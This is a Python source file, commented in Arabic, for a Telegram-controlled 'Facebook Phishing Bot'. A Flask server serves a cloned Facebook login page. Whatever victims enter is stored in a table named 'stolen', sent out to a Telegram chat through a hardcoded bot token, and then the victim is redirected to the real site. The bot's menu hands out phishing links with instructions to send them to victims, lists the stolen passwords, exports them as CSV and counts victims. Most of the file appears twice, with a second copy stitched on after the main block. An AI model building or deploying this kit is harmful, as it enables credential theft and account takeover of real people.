#!/usr/bin/env python3
# Facebook Phishing Bot - Fixed for Python 3.12+
# يعمل على Render + GitHub

import os
import json
import sqlite3
import datetime
import random
import string
import time
import threading
from flask import Flask, request, redirect
import requests
import sys

# ============================================
# إعدادات البوت
# ============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8725714595:AAGBgsBIuRgGyxUVManG9QqzgUqGvMKIkP4")
CHAT_ID = os.environ.get("CHAT_ID", "7890957907")

# ============================================
# إنشاء قاعدة بيانات
# ============================================
def init_db():
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS stolen
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  email TEXT,
                  password TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  timestamp TEXT)''')
    conn.commit()
    conn.close()
    print("[✓] Database initialized")

init_db()

# ============================================
# إرسال رسالة إلى التليجرام
# ============================================
def send_telegram(text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    if keyboard:
        data["reply_markup"] = json.dumps(keyboard)
    try:
        response = requests.post(url, json=data, timeout=10)
        return response
    except Exception as e:
        print(f"Telegram error: {e}")
        return None

# ============================================
# إنشاء أزرار تفاعلية
# ============================================
def get_main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🆕 رابط تصيد جديد", "callback_data": "new_link"}],
            [{"text": "📊 عرض البيانات المسروقة", "callback_data": "show_data"}],
            [{"text": "📥 تصدير البيانات (CSV)", "callback_data": "export_data"}],
            [{"text": "📈 إحصائيات", "callback_data": "stats"}],
            [{"text": "❓ المساعدة", "callback_data": "help"}]
        ]
    }

# ============================================
# صفحة فيسبوك المزورة (HTML)
# ============================================
FACEBOOK_PAGE = '''<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>فيسبوك</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);padding:20px;width:100%;max-width:400px;text-align:center}
.logo{margin-bottom:20px}
.logo h1{color:#1877f2;font-size:48px;font-weight:700}
.input-group{margin-bottom:12px}
.input-group input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
.input-group input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,0.2)}
.login-btn{background:#1877f2;color:white;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:bold;width:100%;cursor:pointer;margin-bottom:16px}
.login-btn:hover{background:#166fe5}
.forgot-link{margin-bottom:20px}
.forgot-link a{color:#1877f2;text-decoration:none;font-size:14px}
hr{border:none;border-top:1px solid #dadde1;margin:20px 0}
.create-btn{background:#42b72a;color:white;border:none;border-radius:6px;padding:12px;font-size:17px;font-weight:bold;width:100%;cursor:pointer;text-decoration:none;display:inline-block}
.create-btn:hover{background:#36a420}
.footer{margin-top:20px;font-size:12px;color:#8a8d91}
.error-msg{background:#be4b49;color:white;padding:10px;border-radius:6px;margin-bottom:12px;display:none;font-size:14px}
</style>
</head>
<body>
<div class="container">
<div class="logo"><h1>facebook</h1></div>
<div class="error-msg" id="errorMsg">رقم الهاتف أو كلمة المرور غير صحيحة</div>
<form method="POST" action="/submit" id="loginForm">
<div class="input-group"><input type="text" id="email" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required autocomplete="off"></div>
<div class="input-group"><input type="password" id="password" name="pass" placeholder="كلمة السر" required></div>
<button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
</form>
<div class="forgot-link"><a href="#">هل نسيت كلمة السر؟</a></div>
<hr>
<a href="#" class="create-btn" id="createBtn">إنشاء حساب جديد</a>
<div class="footer">Meta</div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e){
e.preventDefault();
var email=document.getElementById('email').value;
var password=document.getElementById('password').value;
if(!email||!password){document.getElementById('errorMsg').style.display='block';return;}
var btn=document.getElementById('loginBtn');
btn.disabled=true;
btn.textContent='جاري التحقق...';
var formData=new FormData();
formData.append('email',email);
formData.append('pass',password);
fetch('/submit',{method:'POST',body:formData}).then(function(){window.location.href='https://www.facebook.com';}).catch(function(){window.location.href='https://www.facebook.com';});
});
document.getElementById('createBtn').addEventListener('click',function(e){e.preventDefault();window.location.href='https://www.facebook.com/r.php';});
document.querySelector('.forgot-link a').addEventListener('click',function(e){e.preventDefault();window.location.href='https://www.facebook.com/login/identify/';});
</script>
</body>
</html>'''

# ============================================
# خادم Flask
# ============================================
app = Flask(__name__)

@app.route('/')
def index():
    return FACEBOOK_PAGE

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email', '')
    password = request.form.get('pass', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # حفظ في قاعدة البيانات
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT INTO stolen (email, password, ip, user_agent, timestamp) VALUES (?, ?, ?, ?, ?)",
              (email, password, ip, user_agent, timestamp))
    conn.commit()
    conn.close()
    
    # إرسال إلى التليجرام
    msg = f"""🔴 <b>Facebook Login Stolen!</b> 🔴

📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🌐 <b>IP:</b> <code>{ip}</code>
📱 <b>Device:</b> <code>{user_agent[:80]}</code>
⏰ <b>Time:</b> <code>{timestamp}</code>
"""
    send_telegram(msg)
    send_telegram(f"✅ <b>New Victim!</b>\n{email}:{password}")
    
    return redirect('https://www.facebook.com')

@app.route('/health')
def health():
    return "OK", 200

# ============================================
# معالجة أزرار البوت
# ============================================
def process_callbacks():
    last_update_id = 0
    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get("result", [])
                for update in updates:
                    last_update_id = update.get("update_id", last_update_id)
                    
                    # معالجة الأزرار
                    callback = update.get("callback_query")
                    if callback:
                        data = callback.get("data")
                        callback_id = callback.get("id")
                        
                        # رد على الزر
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                    json={"callback_query_id": callback_id})
                        
                        if data == "new_link":
                            link = public_url
                            msg = f"""✅ <b>رابط التصيد جاهز!</b>

🔗 <b>الرابط:</b> <code>{link}</code>

<b>طريقة الاستخدام:</b>
1️⃣ أرسل الرابط للضحية
2️⃣ سيظهر له صفحة فيسبوك مزورة
3️⃣ عندما يدخل بياناته، ستصل إلى هنا"""
                            send_telegram(msg, get_main_keyboard())
                            
                            keyboard = {"inline_keyboard": [[{"text": "🔗 فتح الرابط", "url": link}]]}
                            send_telegram(f"🔗 رابط التصيد: {link}", keyboard)
                        
                        elif data == "show_data":
                            conn = sqlite3.connect('data.db')
                            c = conn.cursor()
                            c.execute("SELECT email, password, timestamp FROM stolen ORDER BY id DESC LIMIT 10")
                            data_rows = c.fetchall()
                            conn.close()
                            
                            if data_rows:
                                msg = "<b>📊 آخر 10 بيانات مسروقة:</b>\n\n"
                                for i, (email, pwd, ts) in enumerate(data_rows):
                                    msg += f"{i+1}. <code>{email}</code> : <code>{pwd}</code>\n   ⏰ {ts}\n"
                                send_telegram(msg, get_main_keyboard())
                            else:
                                send_telegram("📭 لا توجد بيانات مسروقة حتى الآن", get_main_keyboard())
                        
                        elif data == "export_data":
                            conn = sqlite3.connect('data.db')
                            c = conn.cursor()
                            c.execute("SELECT * FROM stolen ORDER BY id DESC")
                            data_rows = c.fetchall()
                            conn.close()
                            
                            if data_rows:
                                import csv
                                filename = f"facebook_data_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
                                with open(filename, 'w', newline='', encoding='utf-8') as f:
                                    writer = csv.writer(f)
                                    writer.writerow(['ID', 'Email', 'Password', 'IP', 'User Agent', 'Timestamp'])
                                    writer.writerows(data_rows)
                                
                                url_send = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                                with open(filename, 'rb') as f:
                                    files = {'document': f}
                                    data_file = {'chat_id': CHAT_ID, 'caption': "📁 ملف البيانات المسروقة"}
                                    requests.post(url_send, files=files, data=data_file)
                                os.remove(filename)
                                send_telegram("✅ تم تصدير البيانات وإرسالها", get_main_keyboard())
                            else:
                                send_telegram("📭 لا توجد بيانات للتصدير", get_main_keyboard())
                        
                        elif data == "stats":
                            conn = sqlite3.connect('data.db')
                            c = conn.cursor()
                            c.execute("SELECT COUNT(*) FROM stolen")
                            total = c.fetchone()[0]
                            c.execute("SELECT COUNT(*) FROM stolen WHERE date(timestamp) = date('now')")
                            today = c.fetchone()[0]
                            conn.close()
                            
                            msg = f"""<b>📊 إحصائيات التصيد</b>

✅ <b>إجمالي الضحايا:</b> {total}
📅 <b>اليوم:</b> {today}
🟢 <b>الحالة:</b> نشط
🔗 <b>الرابط:</b> <code>{public_url}</code>"""
                            send_telegram(msg, get_main_keyboard())
                        
                        elif data == "help":
                            msg = """<b>📖 المساعدة - Facebook Phishing Bot</b>

<b>🆕 رابط تصيد جديد:</b> ينشئ رابطاً جديداً
<b>📊 عرض البيانات:</b> يعرض آخر 10 بيانات مسروقة
<b>📥 تصدير البيانات:</b> يصدر جميع البيانات كملف CSV
<b>📈 إحصائيات:</b> يعرض إحصائيات الضحايا"""
                            send_telegram(msg, get_main_keyboard())
                    
                    # معالجة الأوامر النصية
                    message = update.get("message", {})
                    text = message.get("text", "")
                    
                    if text == "/start":
                        send_telegram("""🔥 <b>Facebook Phishing Bot</b> 🔥

<b>استخدم الأزرار أدناه:</b>

🆕 رابط تصيد جديد - إنشاء رابط
📊 عرض البيانات - عرض الضحايا
📥 تصدير البيانات - تحميل CSV
📈 إحصائيات - عرض الإحصائيات
""", get_main_keyboard())
                        
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

# ============================================
# التشغيل الرئيسي
# ============================================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════════╗
║     Facebook Phishing Bot - Professional Edition                ║
║     يعمل على Render + GitHub                                    ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    # تشغيل معالج الأزرار
    callback_thread = threading.Thread(target=process_callbacks, daemon=True)
    callback_thread.start()
    
    # تشغيل الخادم
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
init_db()

# ============================================
# إرسال رسالة إلى التليجرام
# ============================================
def send_telegram(text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    if keyboard:
        data["reply_markup"] = json.dumps(keyboard)
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

# ============================================
# إنشاء أزرار تفاعلية رئيسية
# ============================================
def get_main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🆕 رابط تصيد جديد", "callback_data": "new_link"}],
            [{"text": "📊 عرض البيانات المسروقة", "callback_data": "show_data"}],
            [{"text": "📥 تصدير البيانات (CSV)", "callback_data": "export_data"}],
            [{"text": "📈 إحصائيات", "callback_data": "stats"}],
            [{"text": "❓ المساعدة", "callback_data": "help"}]
        ]
    }

# ============================================
# صفحة فيسبوك المزورة (HTML مدمج)
# ============================================
FACEBOOK_PAGE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فيسبوك</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .logo {
            margin-bottom: 20px;
        }
        
        .logo h1 {
            color: #1877f2;
            font-size: 48px;
            font-weight: 700;
        }
        
        .input-group {
            margin-bottom: 12px;
        }
        
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            outline: none;
            font-family: inherit;
        }
        
        .input-group input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        
        .login-btn {
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px;
            font-size: 20px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin-bottom: 16px;
        }
        
        .login-btn:hover {
            background: #166fe5;
        }
        
        .forgot-link {
            margin-bottom: 20px;
        }
        
        .forgot-link a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-link a:hover {
            text-decoration: underline;
        }
        
        hr {
            border: none;
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        
        .create-btn {
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px;
            font-size: 17px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        
        .create-btn:hover {
            background: #36a420;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8a8d91;
        }
        
        .error-msg {
            background: #be4b49;
            color: white;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 12px;
            display: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        
        <div class="error-msg" id="errorMsg">
            رقم الهاتف أو كلمة المرور غير صحيحة
        </div>
        
        <form method="POST" action="/submit" id="loginForm">
            <div class="input-group">
                <input type="text" id="email" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="password" name="pass" placeholder="كلمة السر" required>
            </div>
            <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
        </form>
        
        <div class="forgot-link">
            <a href="#">هل نسيت كلمة السر؟</a>
        </div>
        
        <hr>
        
        <a href="#" class="create-btn" id="createBtn">إنشاء حساب جديد</a>
        
        <div class="footer">
            Meta
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            if(!email || !password) {
                document.getElementById('errorMsg').style.display = 'block';
                return;
            }
            
            var btn = document.getElementById('loginBtn');
            btn.disabled = true;
            btn.textContent = 'جاري التحقق...';
            
            var formData = new FormData();
            formData.append('email', email);
            formData.append('pass', password);
            
            fetch('/submit', {
                method: 'POST',
                body: formData
            }).then(function() {
                window.location.href = 'https://www.facebook.com';
            }).catch(function() {
                window.location.href = 'https://www.facebook.com';
            });
        });
        
        document.getElementById('createBtn').addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'https://www.facebook.com/r.php';
        });
        
        document.querySelector('.forgot-link a').addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'https://www.facebook.com/login/identify/';
        });
    </script>
</body>
</html>
'''

# ============================================
# خادم Flask
# ============================================
app = Flask(__name__)

@app.route('/')
def index():
    return FACEBOOK_PAGE

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email', '')
    password = request.form.get('pass', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # حفظ في قاعدة البيانات
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT INTO stolen (email, password, ip, user_agent, timestamp) VALUES (?, ?, ?, ?, ?)",
              (email, password, ip, user_agent, timestamp))
    conn.commit()
    conn.close()
    
    # إرسال إلى التليجرام
    msg = f"""🔴 <b>Facebook Login Stolen!</b> 🔴

📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🌐 <b>IP:</b> <code>{ip}</code>
📱 <b>Device:</b> <code>{user_agent[:80]}</code>
⏰ <b>Time:</b> <code>{timestamp}</code>
"""
    send_telegram(msg)
    
    # إرسال إشعار سريع
    send_telegram(f"✅ <b>New Victim!</b>\n{email}:{password}")
    
    return redirect('https://www.facebook.com')

@app.route('/health')
def health():
    return "OK", 200

# ============================================
# معالجة أزرار البوت
# ============================================
def process_callbacks():
    last_update_id = 0
    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get("result", [])
                for update in updates:
                    last_update_id = update.get("update_id", last_update_id)
                    
                    # معالجة الأزرار
                    callback = update.get("callback_query")
                    if callback:
                        data = callback.get("data")
                        callback_id = callback.get("id")
                        
                        # رد على الزر
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                    json={"callback_query_id": callback_id})
                        
                        if data == "new_link":
                            link = public_url
                            msg = f"""✅ <b>رابط التصيد جاهز!</b>

🔗 <b>الرابط:</b> <code>{link}</code>

<b>طريقة الاستخدام:</b>
1️⃣ أرسل الرابط للضحية
2️⃣ سيظهر له صفحة فيسبوك مزورة
3️⃣ عندما يدخل بياناته، ستصل إلى هنا

⚠️ الرابط يعمل فوراً!"""
                            send_telegram(msg, get_main_keyboard())
                            
                            # زر الرابط
                            keyboard = {
                                "inline_keyboard": [[
                                    {"text": "🔗 فتح الرابط", "url": link}
                                ]]
                            }
                            send_telegram(f"🔗 رابط التصيد: {link}", keyboard)
                        
                        elif data == "show_data":
                            conn = sqlite3.connect('data.db')
                            c = conn.cursor()
                            c.execute("SELECT email, password, timestamp FROM stolen ORDER BY id DESC LIMIT 10")
                            data_rows = c.fetchall()
                            conn.close()
                            
                            if data_rows:
                                msg = "<b>📊 آخر 10 بيانات مسروقة:</b>\n\n"
                                for i, (email, pwd, ts) in enumerate(data_rows):
                                    msg += f"{i+1}. <code>{email}</code> : <code>{pwd}</code>\n   ⏰ {ts}\n"
                                send_telegram(msg, get_main_keyboard())
                            else:
                                send_telegram("📭 لا توجد بيانات مسروقة حتى الآن", get_main_keyboard())
                        
                        elif data == "export_data":
                            conn = sqlite3.connect('data.db')
                            c = conn.cursor()
                            c.execute("SELECT * FROM stolen ORDER BY id DESC")
                            data_rows = c.fetchall()
                            conn.close()
                            
                            if data_rows:
                                import csv
                                filename = f"facebook_data_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
                                with open(filename, 'w', newline='', encoding='utf-8') as f:
                                    writer = csv.writer(f)
                                    writer.writerow(['ID', 'Email', 'Password', 'IP', 'User Agent', 'Timestamp'])
                                    writer.writerows(data_rows)
                                
                                url_send = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                                with open(filename, 'rb') as f:
                                    files = {'document': f}
                                    data_file = {'chat_id': CHAT_ID, 'caption': "📁 ملف البيانات المسروقة"}
                                    requests.post(url_send, files=files, data=data_file)
                                os.remove(filename)
                                send_telegram("✅ تم تصدير البيانات وإرسالها", get_main_keyboard())
                            else:
                                send_telegram("📭 لا توجد بيانات للتصدير", get_main_keyboard())
                        
                        elif data == "stats":
                            conn = sqlite3.connect('data.db')
                            c = conn.cursor()
                            c.execute("SELECT COUNT(*) FROM stolen")
                            total = c.fetchone()[0]
                            c.execute("SELECT COUNT(*) FROM stolen WHERE date(timestamp) = date('now')")
                            today = c.fetchone()[0]
                            conn.close()
                            
                            msg = f"""<b>📊 إحصائيات التصيد</b>

✅ <b>إجمالي الضحايا:</b> {total}
📅 <b>اليوم:</b> {today}
🟢 <b>الحالة:</b> نشط
🔗 <b>الرابط:</b> <code>{public_url}</code>"""
                            send_telegram(msg, get_main_keyboard())
                        
                        elif data == "help":
                            msg = """<b>📖 المساعدة - Facebook Phishing Bot</b>

<b>🆕 رابط تصيد جديد:</b> ينشئ رابطاً جديداً لصفحة فيسبوك المزورة
<b>📊 عرض البيانات:</b> يعرض آخر 10 بيانات مسروقة
<b>📥 تصدير البيانات:</b> يصدر جميع البيانات كملف CSV
<b>📈 إحصائيات:</b> يعرض إحصائيات الضحايا

<b>⚠️ ملاحظة:</b> جميع البيانات تصل تلقائياً عند دخول الضحايا"""
                            send_telegram(msg, get_main_keyboard())
                    
                    # معالجة الأوامر النصية
                    message = update.get("message", {})
                    text = message.get("text", "")
                    
                    if text == "/start":
                        send_telegram("""
🔥 <b>Facebook Phishing Bot - Professional</b> 🔥

<b>استخدم الأزرار أدناه للتحكم:</b>

🆕 <b>رابط تصيد جديد</b> - إنشاء رابط جديد
📊 <b>عرض البيانات</b> - عرض الضحايا
📥 <b>تصدير البيانات</b> - تحميل البيانات
📈 <b>إحصائيات</b> - عرض الإحصائيات

<b>⚠️ الرابط يعمل فوراً!</b>
""", get_main_keyboard())
                        
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

# ============================================
# التشغيل الرئيسي
# ============================================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════════╗
║     Facebook Phishing Bot - Professional Edition                ║
║     مع أزرار تفاعلية - واجهة فيسبوك مطابقة للأصل               ║
║     يعمل على Render + GitHub                                    ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    # تشغيل معالج الأزرار في خيط منفصل
    callback_thread = threading.Thread(target=process_callbacks, daemon=True)
    callback_thread.start()
    
    # تشغيل الخادم
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
